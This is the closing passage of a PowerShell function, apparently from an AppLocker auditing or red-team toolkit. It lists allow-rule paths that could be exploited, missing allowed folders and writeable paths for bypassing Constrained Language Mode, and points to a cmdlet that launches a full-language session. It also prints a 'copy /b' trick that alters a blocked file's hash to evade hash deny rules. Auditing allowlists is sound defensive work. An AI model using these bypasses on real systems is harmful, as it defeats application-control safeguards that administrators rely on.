                }
            }

            if($ExploitableAllowedPathRules)
            {
                "[+] Allowed Rule paths that can potentially be exploited:"
                $ExploitableAllowedPathRules | Select-Object ParentName,RulePath | Format-Table
            }

            ## Missing folders
            "`n[*] Checking for missing files and folders that has allow rules"
            $MissingAllowedPaths = Get-PALMissingAllowedPaths
            if($MissingAllowedPaths)
            {
                "[+] Missing allowed paths found that can potentially be exploited:"
                $MissingAllowedPaths
            }

            if(!($OfflineXML))
            {
                # CLM bypass
                "`n[*] Checking for potential CLM bypass"
                $CLMInjectiblePaths = Get-PALWriteableAllowedPaths -RuleSection Script
                If($($CLMInjectiblePaths.count) -eq "0")
                {
                    "[-] No user writeable allowed paths found for CLM bypass"
                }
                else
                {
                    "[+] $($CLMInjectiblePaths.count) potential paths found that can be used for CLM bypass"
                    "[+] Use Invoke-PALCLMTempBypass to attempt to launch a full language mode PowerShell session"
                    $CLMInjectiblePaths
                }
            }

            "`n    #######################"
            "    # HASH RULES          #"
            "    #######################"
            ## Denied hash rules
            if($DenyHashRules)
            {
                ForEach($HR in $DenyHashRules)
                {
                    "[+] Found hash deny rule" 
                    "[+] - Add content to file and execute: copy /b blockedfile.exe+txtfile.txt newfile.txt"
                    $HR.RulesList | fl *
                }
            }
            else
            {
                "[-] Did not find any hash deny rules"
            }

        }
        Catch
        {
            write-error $_
        }
        Finally{}
    }
}